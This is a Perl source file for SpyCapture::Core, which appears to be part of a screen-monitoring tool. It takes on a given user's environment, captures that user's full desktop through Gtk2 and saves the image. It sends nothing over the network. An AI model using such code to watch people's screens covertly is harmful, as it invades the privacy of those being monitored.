package SpyCapture::Core;

use strict;
use POSIX;
use Gtk2;

use SpyCapture::Config	();
use SpyCapture::Utils	();
use SpyCapture::Logger	();
use SpyCapture::Storage	();

$SpyCapture::Core::VERSION = '1.1';

sub new {
  my ($class, %args) = @_;
  
  my $self = { %args };
  
  bless($self, $class);
  
  my $config = SpyCapture::Config->new();
  
  $self->{config}  = $config->init();
  $self->{logger}  = SpyCapture::Logger->new();
  $self->{storage} = SpyCapture::Storage->new();
  
  $self->{logger}->info("Initializing SpyCapture $SpyCapture::Core::VERSION");
  
  return $self; 
}


sub Capture {
  my $self = shift;
  
#   my $screen = Gtk2::Gdk::Screen->get_default;
#   my $resolution = $screen->get_resolution;
#  
#   my $window = $screen->get_root_window;
  
  my $manager = Gtk2::Gdk::DisplayManager->get;
  my $dpy = $manager->get_default_display;
  my $screen = $dpy->get_default_screen;
  my $window = $screen->get_root_window;
  
  my ($width, $height) = $window->get_size;
  $self->{logger}->info("Screen size is $width X $height");
  
  my $pixbuf = Gtk2::Gdk::Pixbuf->get_from_drawable(
        $window, undef, 0,0, 0,0, $width, $height
  );
  
  return $pixbuf;
}

sub run {
  my ($self, $user) = @_;
      
  SpyCapture::Utils::set_user_env($user);  
 
  eval{
    Gtk2->init();
  };

  if($@) {
    $self->{logger}->error("There was an error while loading Gtk2 modules");
    die "There was an error while loading Gtk2 core module\n $@";
  }

  my $pixbuf = $self->Capture();

  return $self->{logger}->error("Can't get a pixbuf from the drawable") unless($pixbuf);

  $self->{storage}->save_file($user, $pixbuf);
  return 1;
  
}

1;
